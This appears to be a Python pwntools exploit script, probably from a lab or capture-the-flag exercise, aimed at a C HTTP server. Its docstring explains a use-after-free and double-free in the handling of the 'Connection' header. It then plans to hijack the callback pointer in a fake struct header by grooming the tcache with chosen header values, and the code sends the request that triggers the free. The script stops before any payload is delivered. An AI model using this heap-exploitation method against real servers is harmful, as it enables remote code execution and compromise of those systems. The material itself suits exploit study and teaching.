from pwn import * 

'''
Vulnerability
===================
The 'Connection' header is used to DROP headers within 'interpret_header'.
However, these are NEVER cleared, which results in a use after free
within other classes to 'interpret_header', parse_body and the actual
processing of the headers in 'example.c'.

Eventually, the request information gets cleaned up in 'cleanup_request'. 
At this point, it attempts to clean up the headers in 'req_header_lst'. 
When this happens, it will free the fields of a header and the header itself.
Since we can free the header in 'interpret_header', this leads to an eventual
double free as well. 

Exploitation Thoughts
========================
There are two potential paths to exploitation: 
- Use after free (UAF) on header
- Double free

With the UAF, we can swap in a FAKE 'struct header'. Since this has a function 
pointer inside of it, this object makes for an amazing target. This is shown 
below: 
```
struct header {
    char* name; // Key of the header (name)
    size_t name_len;
    char* value; // Value of the header
    size_t value_len; 
    void* (*custom_callback)(); 
}; 
```

Our general plan of attack is as follows: 
- Trigger UAF by dropping header in the 'Connection' header.
- Allocate this chunk with user controllable data for a fake 'struct header'.
- Call malicious function pointer with our fake object. 

Grooming
==============

Nothing major needs to be done in order set up the heap in a favorable
way prior to the use after free. Whoo!

Once the use after free has occurred, our 'struct header' will be put
into the 0x30 TCache bin. In order to put our fake object here, we will
need to allocate a chunk from the 0x30 TCache Bin with data that we control. 

There are many allocations that allow us to control BOTH the data inside 
and the LENGTH of the data: 
- Host, Origin and User-Agent header values
- X-Request-Id header value

By specifying the 'User-Agent/Origin/Host' header, an allocation is made that depends
on the size of the 'header->value_len'. So, if we allocate the 'User-Agent'
with 0x20 bytes, it will allocate the TCache bin chunk from our 'struct
header', as mentioned before in the LIFO manner of the bin. 
'''

p = remote("127.0.0.1", 8081) 
p.newline = b"\r\n" # Newlines for the 'sendline'

# Verb, path and protocol
first_line = b"POST /SomeRoute HTTP/1.1"
p.sendline(first_line) 

p.sendline(b"Connection:Host") # Free the 'host' header to create a UAF later
p.sendline(b"Host:hacker.com") # Send the 'host' header

# Line to finish the 'header'
p.sendline(b"")
p.interactive()
